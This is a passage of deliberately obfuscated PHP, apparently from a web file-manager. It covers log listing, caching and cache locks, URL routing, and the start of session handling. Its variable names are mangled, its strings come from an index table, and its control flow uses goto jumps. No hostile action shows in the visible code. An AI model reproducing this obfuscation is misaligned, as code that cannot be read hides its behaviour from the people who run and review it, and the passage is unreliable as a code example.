$ô¿ÛÈÑ— = $Ù§¾ş‘[$äñ˜Á»[762]]; $¡İªëª± = isset($Ù§¾ş‘[$äñ˜Á»[505]]) ? $Ù§¾ş‘[$äñ˜Á»[505]] : time(); $çÇŞõ¹[$äñ˜Á»[210]] = array($äñ˜Á»[342], array($ô¿ÛÈÑ—, $¡İªëª±)); } if ($Ù§¾ş‘[$äñ˜Á»[43]]) { $Äş„§ Ó = explode($äñ˜Á»[60], $Ù§¾ş‘[$äñ˜Á»[43]]); $¼‹óùÙ÷ = $this->typeFile(); $ä˜áÌõ‹ = array(); foreach ($Äş„§ Ó as $‘ºÕêıõ) { $ä˜áÌõ‹[] = $‘ºÕêıõ; if (isset($¼‹óùÙ÷[$‘ºÕêıõ])) { $ä˜áÌõ‹ = array_merge($ä˜áÌõ‹, $¼‹óùÙ÷[$‘ºÕêıõ]); } } $ä˜áÌõ‹ = array_unique($ä˜áÌõ‹); if ($ä˜áÌõ‹) { $çÇŞõ¹[$äñ˜Á»[43]] = array($äñ˜Á»[7], $ä˜áÌõ‹); } } else { $çÇŞõ¹[$äñ˜Á»[43]] = array($äñ˜Á»[2242], $äñ˜Á»[2243]); } if (!empty($Ù§¾ş‘[$äñ˜Á»[2241]])) { $çÇŞõ¹[$äñ˜Á»[461]] = array($äñ˜Á»[391], "\45{$Ù§¾ş‘[$äñ˜Á»[2241]]}\x25"); } $ÑÆ’‚ŠË = $this->_makeOrder()->where($çÇŞõ¹)->selectPage(); if (empty($ÑÆ’‚ŠË[$äñ˜Á»[378]])) { show_json(array(), !0, $ÑÆ’‚ŠË[$äñ˜Á»[375]]); } $ÑÆ’‚ŠË[$äñ˜Á»[378]] = $this->logList($ÑÆ’‚ŠË[$äñ˜Á»[378]]); return $ÑÆ’‚ŠË; } private function ipAddress(&$Îœ‡Ğù›) { $ªÆŸŞ¿ =& $_SERVER[¤·²È‰º]; if (!empty($Îœ‡Ğù›[$ªÆŸŞ¿[2241]])) { $ÃÓõíû‡ = IpLocation::get($Îœ‡Ğù›[$ªÆŸŞ¿[2241]]); } else { $ÃÓõíû‡ = LNG($ªÆŸŞ¿[2244]); } $Îœ‡Ğù›[$ªÆŸŞ¿[2245]] = $ÃÓõíû‡; } private function descZipDownload($¯´…×, &$óê†úÒƒ) { $Îƒ–ËÜ— =& $_SERVER[¤·²È‰º]; if (!isset($¯´…×[$Îƒ–ËÜ—[2246]])) { return; } $‘¸Úµƒ‰ = json_decode($¯´…×[$Îƒ–ËÜ—[2246]], !0); foreach ($‘¸Úµƒ‰ as $ï½ØÙû–) { try { $±¾øŠÎ = IO::infoFull($ï½ØÙû–[$Îƒ–ËÜ—[94]]); } catch (Exception $ùêõÚ) { continue; } $¯´…×[$Îƒ–ËÜ—[94]] = $ï½ØÙû–[$Îƒ–ËÜ—[94]]; $óê†úÒƒ[] = $¯´…×[$Îƒ–ËÜ—[410]] = $±¾øŠÎ[$Îƒ–ËÜ—[410]]; $óê†úÒƒ[] = $¯´…×[$Îƒ–ËÜ—[2046]] = $±¾øŠÎ[$Îƒ–ËÜ—[440]]; break; } return $¯´…×; } private function getSourceList(&$û¥×–½) { $§—Í£ğ =& $_SERVER[¤·²È‰º]; $»ç»µå = array(); foreach ($û¥×–½ as $•şş³•Ã => $ÉÁ³ƒóú) { $’ÄĞ†ú« = json_decode($ÉÁ³ƒóú[$§—Í£ğ[461]], !0); if ($ÉÁ³ƒóú[$§—Í£ğ[43]] == $§—Í£ğ[1797]) { $’ÄĞ†ú« = $this->descZipDownload($’ÄĞ†ú«, $»ç»µå); $û¥×–½[$•şş³•Ã][$§—Í£ğ[461]] = json_encode($’ÄĞ†ú«); continue; } if (strpos($ÉÁ³ƒóú[$§—Í£ğ[43]], $§—Í£ğ[2048]) !== 0) { if (!isset($’ÄĞ†ú«[$§—Í£ğ[94]]) || strpos($ÉÁ³ƒóú[$§—Í£ğ[43]], $§—Í£ğ[2247]) !== 0) { continue; } try { $ãĞÉÚü“ = IO::infoFull($’ÄĞ†ú«[$§—Í£ğ[94]]); } catch (Exception $ùõÕ¦ÉÂ) { continue; } $»ç»µå[] = $’ÄĞ†ú«[$§—Í£ğ[410]] = $ãĞÉÚü“[$§—Í£ğ[410]]; $»ç»µå[] = $’ÄĞ†ú«[$§—Í£ğ[2046]] = $ãĞÉÚü“[$§—Í£ğ[440]]; $û¥×–½[$•şş³•Ã][$§—Í£ğ[461]] = json_encode($’ÄĞ†ú«); continue; } $»ç»µå[] = $’ÄĞ†ú«[$§—Í£ğ[410]]; $»ç»µå[] = $’ÄĞ†ú«[$§—Í£ğ[2046]]; if ($’ÄĞ†ú«[$§—Í£ğ[43]] == $§—Í£ğ[565]) { $»ç»µå[] = $’ÄĞ†ú«[$§—Í£ğ[461]][$§—Í£ğ[1154]]; $»ç»µå[] = $’ÄĞ†ú«[$§—Í£ğ[461]][$§—Í£ğ[1155]]; } if ($’ÄĞ†ú«[$§—Í£ğ[43]] == $§—Í£ğ[2056]) { $»ç»µå[] = $’ÄĞ†ú«[$§—Í£ğ[461]][$§—Í£ğ[410]]; } } if (!$»ç»µå) { return array(); } return Model($§—Í£ğ[826])->sourceListInfo($»ç»µå, !0); } private function logList($Âª†ïØï) { $÷…Ã×» =& $_SERVER[¤·²È‰º]; $ãÆ†Ñ®ù = array_to_keyvalue($Âª†ïØï, $÷…Ã×»[12], $÷…Ã×»[1651]); $œîß‡œÂ = Model($÷…Ã×»[543])->userListInfo(array_unique($ãÆ†Ñ®ù)); $Òş­×Ç… = $this->getSourceList($Âª†ïØï); $¯ì¶¿¸ü = $this->typeAll(); $“™Ñ¬¯… = array(); $º€î¯Ôê = array(); foreach ($Âª†ïØï as $’»ŒíŒÀ => $™ƒª²Üá) { $Õ¶³É¤è = $™ƒª²Üá[$÷…Ã×»[43]]; $ğàÏĞ¨ª = isset($œîß‡œÂ[$™ƒª²Üá[$÷…Ã×»[1651]]]) ? $œîß‡œÂ[$™ƒª²Üá[$÷…Ã×»[1651]]] : !1; $ÈÈ”éÈÌ = strpos($Õ¶³É¤è, $÷…Ã×»[2248]) === 0 ? LNG($÷…Ã×»[2249]) : LNG($÷…Ã×»[2244]); $™ƒª²Üá[$÷…Ã×»[42]] = isset($ğàÏĞ¨ª[$÷…Ã×»[42]]) ? $ğàÏĞ¨ª[$÷…Ã×»[42]] : LNG($÷…Ã×»[2244]); $™ƒª²Üá[$÷…Ã×»[550]] = isset($ğàÏĞ¨ª[$÷…Ã×»[550]]) ? $ğàÏĞ¨ª[$÷…Ã×»[550]] : $÷…Ã×»[12]; $™ƒª²Üá[$÷…Ã×»[1550]] = isset($¯ì¶¿¸ü[$Õ¶³É¤è]) ? $¯ì¶¿¸ü[$Õ¶³É¤è] : $ÈÈ”éÈÌ; $™ƒª²Üá[$÷…Ã×»[1991]] = $ğàÏĞ¨ª; $ßİø‚¾ = json_decode($™ƒª²Üá[$÷…Ã×»[461]], !0); $™ƒª²Üá[$÷…Ã×»[2241]] = isset($ßİø‚¾[$÷…Ã×»[2241]]) ? $ßİø‚¾[$÷…Ã×»[2241]] : $÷…Ã×»[12]; $™ƒª²Üá[$÷…Ã×»[2245]] = IpLocation::get($™ƒª²Üá[$÷…Ã×»[2241]]); if (strpos($Õ¶³É¤è, $÷…Ã×»[2048]) === 0 || isset($ßİø‚¾[$÷…Ã×»[2046]])) { $ßİø‚¾[$÷…Ã×»[96]] = $Òş­×Ç…[$ßİø‚¾[$÷…Ã×»[410]]]; $ßİø‚¾[$÷…Ã×»[2061]] = $Òş­×Ç…[$ßİø‚¾[$÷…Ã×»[2046]]]; if ($ßİø‚¾[$÷…Ã×»[43]] == $÷…Ã×»[565]) { $ßİø‚¾[$÷…Ã×»[461]][$÷…Ã×»[1154]] = $Òş­×Ç…[$ßİø‚¾[$÷…Ã×»[461]][$÷…Ã×»[1154]]]; $ßİø‚¾[$÷…Ã×»[461]][$÷…Ã×»[1155]] = $Òş­×Ç…[$ßİø‚¾[$÷…Ã×»[461]][$÷…Ã×»[1155]]]; } if ($ßİø‚¾[$÷…Ã×»[43]] == $÷…Ã×»[2056]) { $ßİø‚¾[$÷…Ã×»[461]][$÷…Ã×»[410]] = $Òş­×Ç…[$ßİø‚¾[$÷…Ã×»[461]][$÷…Ã×»[410]]]; } if ($ßİø‚¾[$÷…Ã×»[43]] == $÷…Ã×»[1792]) { $ßİø‚¾[$÷…Ã×»[2061]] = $ßİø‚¾[$÷…Ã×»[96]]; $ßİø‚¾[$÷…Ã×»[2046]] = $ßİø‚¾[$÷…Ã×»[2061]][$÷…Ã×»[410]]; $ßİø‚¾[$÷…Ã×»[96]] = !1; $ßİø‚¾[$÷…Ã×»[410]] = $÷…Ã×»[12]; } if ($ßİø‚¾[$÷…Ã×»[96]] && $ßİø‚¾[$÷…Ã×»[96]][$÷…Ã×»[419]] == $÷…Ã×»[1270]) { $º€î¯Ôê[] = $™ƒª²Üá[$÷…Ã×»[407]]; unset($Âª†ïØï[$’»ŒíŒÀ]); continue; } if ($ßİø‚¾[$÷…Ã×»[2061]] && $ßİø‚¾[$÷…Ã×»[2061]][$÷…Ã×»[419]] == $÷…Ã×»[1270]) { $º€î¯Ôê[] = $™ƒª²Üá[$÷…Ã×»[407]]; unset($Âª†ïØï[$’»ŒíŒÀ]); continue; } } $™ƒª²Üá[$÷…Ã×»[461]] = $ßİø‚¾; unset($™ƒª²Üá[$÷…Ã×»[2250]]); $“™Ñ¬¯…[] = $™ƒª²Üá; } $this->clearSystemPathLog($º€î¯Ôê); return $“™Ñ¬¯…; } private function clearSystemPathLog($ê½¨¬“¦) { $€§ò‹”ã =& $_SERVER[¤·²È‰º]; if (count($ê½¨¬“¦) == 0) { return; } $Êş¾‘Ğ = array($€§ò‹”ã[407] => array($€§ò‹”ã[7], array_unique($ê½¨¬“¦))); $this->where($Êş¾‘Ğ)->delete(); } public function deviceList($ßèğ÷Ô, $å¸İª«Ù = 0) { $ÎûÆçÏæ =& $_SERVER[¤·²È‰º]; $€²î™ä› = array($ÎûÆçÏæ[1651] => $ßèğ÷Ô, $ÎûÆçÏæ[210] => array($ÎûÆçÏæ[1008], $å¸İª«Ù), $ÎûÆçÏæ[43] => $ÎûÆçÏæ[1766]); $ƒ‡‹í½ß = array(); $ÛºÄë°° = $this->field($ÎûÆçÏæ[2251])->where($€²î™ä›)->order($ÎûÆçÏæ[2059])->limit(50)->select(); foreach ($ÛºÄë°° as $Úœä¨·ë => $›Í›ÊÁŒ) { if ($Úœä¨·ë > 0 && abs($›Í›ÊÁŒ[$ÎûÆçÏæ[210]] - $ÛºÄë°°[$Úœä¨·ë - 1][$ÎûÆçÏæ[210]]) < 5) { continue; } $¶Ö´—é… = json_decode($›Í›ÊÁŒ[$ÎûÆçÏæ[461]], !0); $›Í›ÊÁŒ[$ÎûÆçÏæ[2241]] = isset($¶Ö´—é…[$ÎûÆçÏæ[2241]]) ? $¶Ö´—é…[$ÎûÆçÏæ[2241]] : $ÎûÆçÏæ[12]; unset($¶Ö´—é…[$ÎûÆçÏæ[2241]]); $öïÅÁ¹ = $this->deviceType($¶Ö´—é…[$ÎûÆçÏæ[2049]]); if (isset($ƒ‡‹í½ß[$öïÅÁ¹])) { continue; } $›Í›ÊÁŒ[$ÎûÆçÏæ[2245]] = IpLocation::get($›Í›ÊÁŒ[$ÎûÆçÏæ[2241]]); $›Í›ÊÁŒ[$ÎûÆçÏæ[461]] = $¶Ö´—é…; $ƒ‡‹í½ß[$öïÅÁ¹] = $›Í›ÊÁŒ; } return array_values($ƒ‡‹í½ß); } public function deviceType($­§¢·Õ«) { return $­§¢·Õ«; } } goto C§ò“ŠÍ; bçô¼àò¼: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ğ™Ì®¥¦ =& $_SERVER[¤·²È‰º]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $´ù÷ÍŒÛ = $GLOBALS[$ğ™Ì®¥¦[6]][$ğ™Ì®¥¦[358]]; $«×êı°Š = $´ù÷ÍŒÛ[$´ù÷ÍŒÛ[$ğ™Ì®¥¦[828]]]; $›ÑÍ…ÂŞ = $´ù÷ÍŒÛ[$ğ™Ì®¥¦[829]]; switch ($´ù÷ÍŒÛ[$ğ™Ì®¥¦[828]]) { case $ğ™Ì®¥¦[31]: self::$handle = Model($ğ™Ì®¥¦[830]); break; case $ğ™Ì®¥¦[831]: self::$handle = new CacheRedis($«×êı°Š, $›ÑÍ…ÂŞ); break; case $ğ™Ì®¥¦[832]: self::$handle = new CacheMemcached($«×êı°Š, $›ÑÍ…ÂŞ); break; case $ğ™Ì®¥¦[209]: self::$handle = new CacheFile($«×êı°Š, $›ÑÍ…ÂŞ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($İ¾à‘£÷) { if (is_array($İ¾à‘£÷) || is_object($İ¾à‘£÷)) { $İ¾à‘£÷ = json_encode($İ¾à‘£÷); } $İ¾à‘£÷ = rawurlencode($İ¾à‘£÷); return md5(KOD_SITE_ID . $_SERVER[¤·²È‰º][11] . $İ¾à‘£÷); } public static function get($™„ˆ¥œ², $ñµØÇîˆ = false) { $½ÏÀà’Å = self::key($™„ˆ¥œ²); if ($ñµØÇîˆ) { return unserialize(self::init()->get($½ÏÀà’Å)); } if (!isset(self::$memoryCache[$½ÏÀà’Å])) { $ß¿©†ÔÄ = self::init()->get($½ÏÀà’Å); self::$memoryCache[$½ÏÀà’Å] = unserialize($ß¿©†ÔÄ); } return self::$memoryCache[$½ÏÀà’Å]; } public static function set($½°æòì‰, $Ôù³±¬, $öşœÜù‘ = false) { $÷Äºñ¾Ö = self::key($½°æòì‰); if (isset(self::$memoryCache[$÷Äºñ¾Ö]) && self::$memoryCache[$÷Äºñ¾Ö] === $Ôù³±¬) { return !0; } if ($öşœÜù‘ === 0) { self::$memoryCache[$÷Äºñ¾Ö] = $Ôù³±¬; return !0; } CacheLock::lock($½°æòì‰); $ÏöÎªõÂ = self::init()->set($÷Äºñ¾Ö, serialize($Ôù³±¬), $öşœÜù‘); self::$memoryCache[$÷Äºñ¾Ö] = $Ôù³±¬; CacheLock::unlock($½°æòì‰); return $ÏöÎªõÂ; } public static function getCall($Õ²ÁäÍÖ, $¹‘¸©ÓØ, $Òãé®´ï, $Á†Ï¼½ƒ = array()) { $•§¬¦ =& $_SERVER[¤·²È‰º]; $çûÁÃò = self::get($Õ²ÁäÍÖ); if ($çûÁÃò || $çûÁÃò === $•§¬¦[12]) { return $çûÁÃò; } $çûÁÃò = call_user_func_array($Òãé®´ï, $Á†Ï¼½ƒ); $çûÁÃò = $çûÁÃò ? $çûÁÃò : $•§¬¦[12]; self::set($Õ²ÁäÍÖ, $çûÁÃò, $¹‘¸©ÓØ); return $çûÁÃò; } public static function remove($£¤µ‘Ö) { $÷‡éùËõ = self::key($£¤µ‘Ö); unset(self::$memoryCache[$÷‡éùËõ]); self::clearTimeout(); CacheLock::lock($£¤µ‘Ö); $Ğ‘ÓÊ‘„ = self::init()->remove($÷‡éùËõ); CacheLock::unlock($£¤µ‘Ö); return $Ğ‘ÓÊ‘„; } public static function removeMemory($ÂŒØßâ˜) { $Î¿¿é™ = self::key($ÂŒØßâ˜); unset(self::$memoryCache[$Î¿¿é™]); } public static function clearMemory($–•¦Ú„Ë = false) { if ($–•¦Ú„Ë) { $–•¦Ú„Ë = self::key($–•¦Ú„Ë); unset(self::$memoryCache[$–•¦Ú„Ë]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¤·²È‰º][833])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¤·²È‰º][834])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($çÃ‹Ô·¢, $û†ıĞ®Â) { $­‹ÛêÆ¼ =& $_SERVER[¤·²È‰º]; $this->cachePath = $çÃ‹Ô·¢[$­‹ÛêÆ¼[94]]; $this->prefix = $­‹ÛêÆ¼[835]; $this->cacheTime = $û†ıĞ®Â; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($™ªè‹ÛÕ) { $ıĞ›Õ»Æ =& $_SERVER[¤·²È‰º]; $™ªè‹ÛÕ = str_replace(array($ıĞ›Õ»Æ[836], $ıĞ›Õ»Æ[107], $ıĞ›Õ»Æ[83]), $ıĞ›Õ»Æ[837], $™ªè‹ÛÕ); return $this->cachePath . $ıĞ›Õ»Æ[838] . $™ªè‹ÛÕ . $ıĞ›Õ»Æ[839]; } public function set($œŠ“ï©, $½ôÁ£ª, $İ†ˆÌ™Œ = false) { $È”²¨İ = $this->getFile($œŠ“ï©); if (file_put_contents($È”²¨İ, $this->prefix . $½ôÁ£ª, LOCK_EX)) { @touch($È”²¨İ, intval(time() + $İ†ˆÌ™Œ)); clearstatcache(); return !0; } @unlink($È”²¨İ); return !1; } public function get($¦ùÛÉµé) { $È“ÏÀš = $this->getFile($¦ùÛÉµé); if (file_exists($È“ÏÀš) && filemtime($È“ÏÀš) < time()) { @unlink($È“ÏÀš); return !1; } $ìøä­ñô = @file_get_contents($È“ÏÀš); return substr($ìøä­ñô, strlen($this->prefix)); } public function remove($åÏÎøÔò) { $İˆÔœáş = $this->getFile($åÏÎøÔò); return @unlink($İˆÔœáş); } public function deleteAll() { $ğœÕå× =& $_SERVER[¤·²È‰º]; $›ùê‰ = scandir($this->cachePath); foreach ($›ùê‰ as $µÄƒ¾éù) { $¥Úóœ¨É = $this->cachePath . $µÄƒ¾éù; if (strpos($¥Úóœ¨É, $ğœÕå×[839]) && strpos($¥Úóœ¨É, $ğœÕå×[840])) { @unlink($¥Úóœ¨É); } } } public function clearTimeout() { $†¸œÏ¼ =& $_SERVER[¤·²È‰º]; $ÇªÓ’¬¹ = scandir($this->cachePath); foreach ($ÇªÓ’¬¹ as $¬à×È®„) { $‰‰—ƒ¤ğ = $this->cachePath . $¬à×È®„; if (strpos($‰‰—ƒ¤ğ, $†¸œÏ¼[839]) && strpos($‰‰—ƒ¤ğ, $†¸œÏ¼[840]) && filemtime($‰‰—ƒ¤ğ) < time()) { @unlink($‰‰—ƒ¤ğ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $•Òõº´† =& $_SERVER[¤·²È‰º]; if (self::$handle) { return self::$handle; } $Ø‘¦Èùº = $GLOBALS[$•Òõº´†[6]][$•Òõº´†[358]]; self::$timeout = $Ø‘¦Èùº[$•Òõº´†[841]] ? $Ø‘¦Èùº[$•Òõº´†[841]] : 10; $“øÍ‡˜û = _get($GLOBALS[$•Òõº´†[6]], $•Òõº´†[842]); $û¼Æè³÷ = $Ø‘¦Èùº[$•Òõº´†[828]] ? $Ø‘¦Èùº[$•Òõº´†[828]] : $•Òõº´†[209]; if ($û¼Æè³÷ == $•Òõº´†[31] && $“øÍ‡˜û == $•Òõº´†[23]) { $û¼Æè³÷ = $•Òõº´†[209]; } switch ($û¼Æè³÷) { case $•Òõº´†[831]: self::$handle = new CacheLockRedis(); break; case $•Òõº´†[832]: self::$handle = new CacheLockMemcached(); break; case $•Òõº´†[31]: self::$handle = new CacheLockDatabase(); break; case $•Òõº´†[209]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($•Òõº´†[843], $•Òõº´†[844]); } return self::$handle; } private static function key($íÁ…¶) { return $_SERVER[¤·²È‰º][845] . Cache::key($íÁ…¶); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($æŒ êâı = '') { self::$errorMsg = $æŒ êâı; } public static function lockGlobal($¡¹ó„ğº, $£øÀÆÓ„) { return self::lock($¡¹ó„ğº, $£øÀÆÓ„, !0); } public static function lock($ğ˜‹°, $Æ¼ÖÌõ­ = false, $ˆ˜¶÷Ø = false) { $¬Æ¦¶Ø =& $_SERVER[¤·²È‰º]; $¤ÅÖÆşá = self::init(); $·ÚèÜ­” = self::key($ğ˜‹°); $Æ¼ÖÌõ­ = $Æ¼ÖÌõ­ ? $Æ¼ÖÌõ­ : self::$timeout; $ş¾ÕÂèÀ = $¤ÅÖÆşá->lock($·ÚèÜ­”, $Æ¼ÖÌõ­); $é®Ê‘ô‡ = timeFloat(); if (!$ş¾ÕÂèÀ) { $Åë¡Ê½¨ = "\154\x6f\x63\153\40\145\x72\162\x6f\162\x3b\x6b\x65\x79\75{$ğ˜‹°}\x3b\164\151\155\145\x3d{$Æ¼ÖÌõ­}\73" . self::$errorMsg . $¬Æ¦¶Ø[81] . get_caller_msg(); $¿³Ô°¸¸ = LNG($¬Æ¦¶Ø[846]) . "\50{$Æ¼ÖÌõ­}\x73\51\56" . LNG($¬Æ¦¶Ø[847]); $¿³Ô°¸¸ .= $¬Æ¦¶Ø[848]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¿³Ô°¸¸ = $¿³Ô°¸¸ . $¬Æ¦¶Ø[849] . self::$errorMsg; } write_log($Åë¡Ê½¨, $¬Æ¦¶Ø[844]); show_json($¿³Ô°¸¸, !1); } if (!$ˆ˜¶÷Ø) { self::$lockItem[$·ÚèÜ­”] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ÀĞ·È¼Ø = number_format(timeFloat() - $é®Ê‘ô‡, 3); write_log($¬Æ¦¶Ø[850] . $ğ˜‹° . $¬Æ¦¶Ø[851] . $ÀĞ·È¼Ø, $¬Æ¦¶Ø[844]); } return $ş¾ÕÂèÀ; } public static function lockGet($¡£­ç™‹) { $›úŞú£º = self::key($¡£­ç™‹); if (self::$lockItem[$›úŞú£º]) { return self::$lockItem[$›úŞú£º]; } return self::init()->lockGet($›úŞú£º); } public static function unlock($ïƒóìõ) { $üş»ö®µ =& $_SERVER[¤·²È‰º]; $Ó…ş¾¤ = self::key($ïƒóìõ); self::$lockItem[$Ó…ş¾¤] = null; self::init()->unlock($Ó…ş¾¤); if (GLOBAL_DEBUG_LOG_ALL) { write_log($üş»ö®µ[852] . $ïƒóìõ, $üş»ö®µ[844]); } return; } public static function unlockRuntime() { $£½³™£ò =& $_SERVER[¤·²È‰º]; $¨øÀ÷ı¶ = self::init(); $ÚìºÉãÉ = !1; foreach (self::$lockItem as $ÄñŸ§¬õ => $¹½âõó) { if (!$¹½âõó) { continue; } $¨øÀ÷ı¶->unlock($ÄñŸ§¬õ); if (!$ÚìºÉãÉ) { $ÚìºÉãÉ = !0; write_log($£½³™£ò[853] . $ÄñŸ§¬õ . $£½³™£ò[81] . get_caller_msg(), $£½³™£ò[844]); continue; } write_log($£½³™£ò[853] . $ÄñŸ§¬õ, $£½³™£ò[844]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¼ÅÜõ¯Ê = number_format(timeFloat() - TIME_FLOAT, 3); write_log($£½³™£ò[854] . $¼ÅÜõ¯Ê . $£½³™£ò[855] . ACTION, $£½³™£ò[844]); } } public static function fileLock($£Õ·óú©) { $Şç¶Ö¤¾ =& $_SERVER[¤·²È‰º]; if (!$GLOBALS[$Şç¶Ö¤¾[856]]) { $GLOBALS[$Şç¶Ö¤¾[856]] = array(); } $GLOBALS[$Şç¶Ö¤¾[856]][$£Õ·óú©] = !1; $şĞ—ûáë = fopen(DATA_PATH . $£Õ·óú© . $Şç¶Ö¤¾[857], $Şç¶Ö¤¾[858]); if (!$şĞ—ûáë) { return !1; } $GLOBALS[$Şç¶Ö¤¾[856]][$£Õ·óú©] = $şĞ—ûáë; if (flock($şĞ—ûáë, LOCK_EX)) { return !0; } self::unlock($£Õ·óú©); show_json($Şç¶Ö¤¾[859], !1); return !1; } public static function fileUnlock($È×‡‘†˜) { $ÆÇ±Ç‰‰ =& $_SERVER[¤·²È‰º]; $şÉˆÀ£ = $GLOBALS[$ÆÇ±Ç‰‰[856]][$È×‡‘†˜]; if (!$şÉˆÀ£) { return; } $GLOBALS[$ÆÇ±Ç‰‰[856]][$È×‡‘†˜] = !1; flock($şÉˆÀ£, LOCK_UN); fclose($şÉˆÀ£); } public static function fileUnlockAll() { $ïØ‰–®‘ =& $_SERVER[¤·²È‰º]; if (!$GLOBALS[$ïØ‰–®‘[856]]) { return; } foreach ($GLOBALS[$ïØ‰–®‘[856]] as $Îô§ÁŞª => $ğÇ¿Âƒ¼) { if (!$ğÇ¿Âƒ¼) { continue; } $GLOBALS[$ïØ‰–®‘[856]][$Îô§ÁŞª] = !1; flock($ğÇ¿Âƒ¼, LOCK_UN); fclose($ğÇ¿Âƒ¼); } $GLOBALS[$ïØ‰–®‘[856]] = array(); } } goto EÏçµ„ÜÏñ; Aä¶öù©Ü¾: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\133\136\57\135\x2b", "\x3a\x6e\x75\x6d" => "\x5b\x30\x2d\71\135\x2b", "\72\141\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($†Û§ñ­í, $£Ù®ãü“) { $êİû»ş =& $_SERVER[¤·²È‰º]; if ($†Û§ñ­í == $êİû»ş[1595]) { $íÊÙ…á· = array_map($êİû»ş[1596], $£Ù®ãü“[0]); $¡ ¢ƒ« = strpos($£Ù®ãü“[1], $êİû»ş[8]) === 0 ? $£Ù®ãü“[1] : $êİû»ş[8] . $£Ù®ãü“[1]; $Õã¶öÅ = $£Ù®ãü“[2]; } else { $íÊÙ…á· = null; $¡ ¢ƒ« = strpos($£Ù®ãü“[0], $êİû»ş[8]) === 0 ? $£Ù®ãü“[0] : $êİû»ş[8] . $£Ù®ãü“[0]; $Õã¶öÅ = $£Ù®ãü“[1]; } array_push(self::$maps, $íÊÙ…á·); array_push(self::$routes, $¡ ¢ƒ«); array_push(self::$methods, strtoupper($†Û§ñ­í)); array_push(self::$callbacks, $Õã¶öÅ); } public static function error($ÆıÊ”èâ) { self::$errorCallback = $ÆıÊ”èâ; } public static function haltOnMatch($ŠÇıçñı = true) { self::$halts = $ŠÇıçñı; } public static function dispatch() { $ˆèŒŠ†Ä =& $_SERVER[¤·²È‰º]; $Óä¹ç’± = parse_url($_SERVER[$ˆèŒŠ†Ä[1597]], PHP_URL_PATH); $¹ß½—Üú = $_SERVER[$ˆèŒŠ†Ä[169]]; $ùÏƒùÀ = array_keys(static::$patterns); $„È¸³ŸÍ = array_values(static::$patterns); $™á…ĞÄ  = !1; self::$routes = preg_replace($ˆèŒŠ†Ä[1263], $ˆèŒŠ†Ä[8], self::$routes); if (in_array($Óä¹ç’±, self::$routes)) { $¼º÷ÓßÔ = array_keys(self::$routes, $Óä¹ç’±); foreach ($¼º÷ÓßÔ as $Ö£³¸ß«) { if (self::$methods[$Ö£³¸ß«] == $¹ß½—Üú || self::$methods[$Ö£³¸ß«] == $ˆèŒŠ†Ä[1598] || in_array($¹ß½—Üú, self::$maps[$Ö£³¸ß«])) { $™á…ĞÄ  = !0; if (!is_object(self::$callbacks[$Ö£³¸ß«])) { $‚ç©™€° = explode($ˆèŒŠ†Ä[8], self::$callbacks[$Ö£³¸ß«]); $œÍ“¥© = end($‚ç©™€°); $½ƒÏÁş• = explode($ˆèŒŠ†Ä[1599], $œÍ“¥©); $Ò¾Æ»‹ü = new $½ƒÏÁş•[0](); $Ò¾Æ»‹ü->{$½ƒÏÁş•[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Ö£³¸ß«]); if (self::$halts) { return; } } } } } else { $›Ã¹œ¦ğ = 0; foreach (self::$routes as $Ö£³¸ß«) { if (strpos($Ö£³¸ß«, $ˆèŒŠ†Ä[4]) !== !1) { $Ö£³¸ß« = str_replace($ùÏƒùÀ, $„È¸³ŸÍ, $Ö£³¸ß«); } if (preg_match($ˆèŒŠ†Ä[1600] . $Ö£³¸ß« . $ˆèŒŠ†Ä[1601], $Óä¹ç’±, $¨®·«ì)) { if (self::$methods[$›Ã¹œ¦ğ] == $¹ß½—Üú || self::$methods[$›Ã¹œ¦ğ] == $ˆèŒŠ†Ä[1598] || !empty(self::$maps[$›Ã¹œ¦ğ]) && in_array($¹ß½—Üú, self::$maps[$›Ã¹œ¦ğ])) { $™á…ĞÄ  = !0; array_shift($¨®·«ì); if (!is_object(self::$callbacks[$›Ã¹œ¦ğ])) { $‚ç©™€° = explode($ˆèŒŠ†Ä[8], self::$callbacks[$›Ã¹œ¦ğ]); $œÍ“¥© = end($‚ç©™€°); $½ƒÏÁş• = explode($ˆèŒŠ†Ä[1599], $œÍ“¥©); $Ò¾Æ»‹ü = new $½ƒÏÁş•[0](); if (!method_exists($Ò¾Æ»‹ü, $½ƒÏÁş•[1])) { echo $ˆèŒŠ†Ä[1602]; } else { call_user_func_array(array($Ò¾Æ»‹ü, $½ƒÏÁş•[1]), $¨®·«ì); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$›Ã¹œ¦ğ], $¨®·«ì); if (self::$halts) { return; } } } } $›Ã¹œ¦ğ++; } } if ($™á…ĞÄ  == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $å¬«ïßä =& $_SERVER[¤·²È‰º]; header($_SERVER[$å¬«ïßä[1603]] . $å¬«ïßä[1604]); echo $å¬«ïßä[1605]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ˆèŒŠ†Ä[1597]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $…¥Ÿæİ =& $_SERVER[¤·²È‰º]; static $šÌÊŸÏö = false; if ($šÌÊŸÏö) { return $šÌÊŸÏö; } $êÓ½Òœ = 